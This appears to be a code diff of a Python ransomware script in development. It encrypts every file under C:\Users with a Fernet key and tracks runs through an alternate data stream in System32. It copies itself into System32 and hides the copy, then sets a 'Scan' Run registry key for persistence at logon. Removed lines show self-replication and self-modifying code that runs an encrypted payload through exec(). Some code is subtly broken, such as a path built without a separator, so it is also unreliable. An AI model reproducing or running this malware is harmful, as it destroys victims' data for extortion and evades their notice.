@@ -23,55 +23,63 @@ def def_handler(sig, frame):
 signal.signal(signal.SIGINT, def_handler)
 
 
+# Create a file txt in C:\Windows\System32
 def create_file_in_system32(filename, content):
     system32_dir = r"C:\Windows\System32"
-
     file_path = os.path.join(system32_dir, filename)
-
     try:
         with open(file_path, "w", encoding="utf-8") as file:
             file.write(content)
-
+        print(colored(f"\n[*] File created in system32", "green"))
     except PermissionError:
         print(colored(f"\n[!] Permission Error", "red"))
     except Exception as e:
-        print(f"Error: {e}")
+        print(colored(f"\n[!] Error: {e}", "red"))
 
-
+# Read ADS
 def read_executions_from_ads(file_path):
     ads_path = f"{file_path}:executions"
     try:
         with open(ads_path, "r") as f:
-            return int(f.read().strip())
+            executions_r = int(f.read().strip())
+            print(colored(f"\n[*] Executions: {executions_r}", "green"))
+            return executions_r
     except FileNotFoundError:
+        print(colored(f"\n[!] Error on reading ADS", "red"))
         return 0
+    except Exception as e:
+        print(colored(f"\n[!] Error: {e}", "red"))
 
-
+# Write ADS
 def write_executions_to_ads(file_path, value):
     ads_path = f"{file_path}:executions"
-    with open(ads_path, "w") as f:
-        f.write(str(value))
+    try:
+        with open(ads_path, "w") as f:
+            f.write(str(value))
+        print(colored(f"\n[*] Ads success", "green"))
+    except FileNotFoundError:
+        print(colored(f"\n[!] Error: File not found"))
+    except Exception as e:
+        print(colored(f"\n[!] Error: {e}", "red"))
 
-
-def on_logon_registry(c_dir, file_e):
-    dest_dir = r"C:\Windows\System32"
+# Persistence modifying SO registry to start the file on logon
+def on_logon_registry(c_dir, file_e, dest_dir):
     try:
         if file_e not in dest_dir:
             shutil.copy2(file_e, dest_dir)
             time.sleep(4)
         if file_e in c_dir:
             c_dir.remove(file_e)
-        new_filepath = os.path.join(dest_dir, file_e)
+        new_filepath = os.path.join(dest_dir, file_e).decode()
         ctypes.windll.kernel32.SetFileAttributesW(new_filepath, 2)
-        regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-
+        regpath = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
         reghive = winreg.HKEY_CURRENT_USER
         reg = winreg.ConnectRegistry(None, reghive)
         key_reg = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
         winreg.SetValueEx(key_reg, "Scan", 0, winreg.REG_SZ, new_filepath)
-
+        print(colored(f"\n[!] Persistent success", "green"))
     except Exception as e:
-        pass
+        print(colored(f"\n[!] Error: {e}", "red"))
 
 
 def tmp_task():
@@ -82,7 +90,9 @@ def tmp_task():
         # Crear archivo temporal en la carpeta del sistema
         temp_dir = tempfile.gettempdir()
         temp_script_path = os.path.join(temp_dir, "temp_script.py")
-
+        a_dir = os.getcwd()
+        dir_comp = os.path.join(a_dir, "art")
+        print(colored(f"\n[!] {dir_comp}"))
         # Escribir un nuevo script Python en el archivo temporal
         with open(temp_script_path, 'w', encoding='utf-8') as temp_script:
             temp_script.write(
@@ -91,8 +101,7 @@ def tmp_task():
                 "# Código que se ejecutará desde el archivo temporal\n"
                 "print('Ejecutando desde el archivo temporal.')\n\n"
                 "# Ejecutar nuevamente el script original\n"
-                f"subprocess.run(['python', '{sys.argv[0]}'])\n"
-                "print(f'{sys.argv[0]}')"
+                f"subprocess.run([{dir_comp}])\n"
             )
 
         print(f"Archivo temporal creado: {temp_script_path}")
@@ -102,23 +111,13 @@ def tmp_task():
 
         # Ejecutar el script desde el archivo temporal
         subprocess.run([sys.executable, temp_script_path])
-
+        print("[!] Second execution ...")
 
 
     else:
         print("Segunda ejecución completada desde el archivo temporal.")
 
 
-def c_e(code, key):
-    fernet = Fernet(key)
-    encrypted_code = fernet.encrypt(code.encode())
-    return encrypted_code
-
-
-def d_e(encrypted_code, key):
-    fernet = Fernet(key)
-    decrypted_code = fernet.decrypt(encrypted_code).decode()
-    return decrypted_code
 
 
 def gen_key():
@@ -133,110 +132,54 @@ def return_key():
 
 def file_encrypt(files, key):
     fernet = Fernet(key)
-    for filepath in files:
-        with open(filepath, "rb") as file:
-            data_to_encrypt = file.read()
-        data = fernet.encrypt(data_to_encrypt)
-
-        # Guardar el archivo cifrado
-        with open(filepath, "wb") as file:
-            file.write(data)
-
-
-def replicated():
-    current_file = __file__
-    filedir = os.path.join(os.getcwd(), "Note")
-    filename = sys.argv[0]
-    filepath = os.path.join(filedir, filename)
     try:
-        shutil.copy2(filename, filedir)
-        time.sleep(2)
-        os.remove(current_file)
-    except Exception as e:
-        pass
-
-
-def self_modifying_code(keycode):
-    new_code = """
-encrypted_code = b'{encrypted_code}'
-exec(d_e(encrypted_code, b'{key}'))
-"""
-
-    code_to_add = r'''
-def open_video(f_video):
-    while (video_f.isOpened()):
-        ret, image = video_f.read()
-        if ret == False:
-            break
-        f_video.imshow('Imagen', im)
-        if cv2.waitKey(1) & 0xFF == 27:
-            break
-    f_video.release()
-    cv2.destroyAllWindows()
-
-def file_encrypt(files, key):
-    fernet = Fernet(key)
-    try:
-        for filepath in files:  
-            with open(filepath, "rb") as file:  
+        for filepath in files:
+            with open(filepath, "rb") as file:
                 data_to_encrypt = file.read()
             data = fernet.encrypt(data_to_encrypt)
 
-            with open(filepath, "wb") as file:  
+            with open(filepath, "wb") as file:
                 file.write(data)
     except Exception as e:
         pass
 
 
-base_directory = r"C:\Users"
-allfiles1.searching_files(base_directory)
-files = allfiles1.file_list
-
-#video = cv2.VideoCapture('formacion_random.mp4')
-executions = read_executions_from_ads(file_path_ads)
-if executions != 2:
-    gen_key()
-    key = return_key()
-
-    file_encrypt(files, key)
-time.sleep(5)
-subprocess.run(["interface"])
-
-    if executions != 2:
-        executions=2
-        write_executions_to_ads(file_path_ads, executions)
-#open_video(video)
-'''
-
-    encrypted_code = c_e(code_to_add, keycode).decode()
-    formatted_code = new_code.format(encrypted_code=encrypted_code, key=keycode.decode())
-
-    current_file = __file__
-    with open(current_file, 'a') as f:
-        f.write(formatted_code)
-
-
 def main():
-    script_path = os.path.abspath(__file__)
-    if executions != 2:
+    # create file in system32 -> ADS
+    file_ads_name = "windows.txt"
+    content = "Scan Report"
+    create_file_in_system32(file_ads_name, content)
+    # path ADS
+    file_path_ads = r"C:\Windows\System32"
+    path_ads = file_path_ads + file_ads_name
+    executions = read_executions_from_ads(path_ads)
+    print(colored(f"[*] Executions -> {executions}", "green"))
+    # Persistence creation if executions != 2
+    current_dir = os.path.dirname(os.path.abspath(__file__))
+    py_e = os.path.abspath(__file__)
+    # Search files from a base diretory
+    base_directory = r"C:\Users"
+    allfiles1.searching_files(base_directory)
+    files = allfiles1.file_list
+    if int(executions) != 2:
+        # Let's encrypt all the files
         keycode = Fernet.generate_key()
-        self_modifying_code(keycode)
-
-    # subprocess.run(["python3", "ads_file.py", "texto3.txt", "-a", "art.py"])
-    # time.sleep(10)
-
+        gen_key()
+        key = return_key()
+        file_encrypt(files, key)
+        time.sleep(5)
+        subprocess.run(["interface"])
+        # Set number of executions to not encrypt more times the files
+        executions_n = 2
+        write_executions_to_ads(path_ads, executions_n)
+        time.sleep(6)
+        # Create a persistence
+        on_logon_registry(current_dir, py_e, file_path_ads)
 
 if __name__ == '__main__':
-    create_file_in_system32("windows.txt", "Windows system")
-    file_path_ads = r"C:\Windows"
-    executions = read_executions_from_ads(file_path_ads)
-    current_dir = os.path.dirname(os.path.abspath(__file__))
-    py_e = "art.exe"
     main()
-    if executions != 2:
-        tmp_task()
-        time.sleep(4)
-        on_logon_registry(current_dir, py_e)
+
+
 
 
 
